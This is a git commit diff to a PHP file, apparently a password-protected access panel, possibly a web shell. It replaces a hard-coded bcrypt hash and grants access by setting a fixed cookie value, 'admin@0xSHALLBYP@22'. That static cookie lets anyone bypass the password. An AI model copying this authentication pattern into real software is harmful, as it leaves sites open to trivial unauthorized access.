ed14fe7a481885cea14a64240e8ef55272115689
ahmadMM1 <55327250+ahmadMM1@users.noreply.github.com>
2025-08-05 16:48:12 +0700

    Update Bylitlepv2.php

--- Bylitlepv2.php
+++ Bylitlepv2.php
@@ -64,7 +64,7 @@ if (is_logged_in()) {
 } else {
     if (isset($_POST['password'])) {
         $entered_key = $_POST['password'];
-        $hashed_key = '$2y$12$NfqKUJFLI7kqRgO.W/rjFeHmBRuxm/LVFY72xtx811ZR69e87SWw.';
+        $hashed_key = '$2y$10$gtCTLu4h7veCJ7ojSSh/GeKZOnrshGp4layB6GhrCTAlCbSE6uW3e';
         
         if (password_verify($entered_key, $hashed_key)) {
             setcookie('user_id', 'admin@0xSHALLBYP@22', time() + 3600, '/'); 
@@ -157,3 +157,4 @@ if (is_logged_in()) {
     <?php
 }
 ?>
+
